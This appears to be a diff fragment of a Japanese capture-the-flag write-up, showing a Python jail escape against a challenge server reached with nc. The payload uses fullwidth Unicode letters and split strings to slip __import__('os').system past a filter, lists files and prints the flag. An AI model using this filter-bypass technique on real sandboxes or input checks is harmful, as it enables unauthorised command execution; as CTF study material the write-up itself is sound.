@@ -27,7 +27,7 @@ $ nc 34.100.177.188 1337
 >>> __ｉｍｐｏｒｔ__("o"+"s").ｓｙｓｔｅｍ("ls")
 flag.txt
 main.py
->>> __ｉｍｐｏｒｔ__("o"+"s").ｓｙｓｔｅｍ('c'+'at f'+'lag.txt')
+>>> __ｉｍｐｏｒｔ__("o"+"s").ｓｙｓｔｅｍ("c"+"at f"+"lag.txt")
 nitectf{sl1d3_0ver_th3se_4ttribut3s}
 ```
 flagが得られた。  
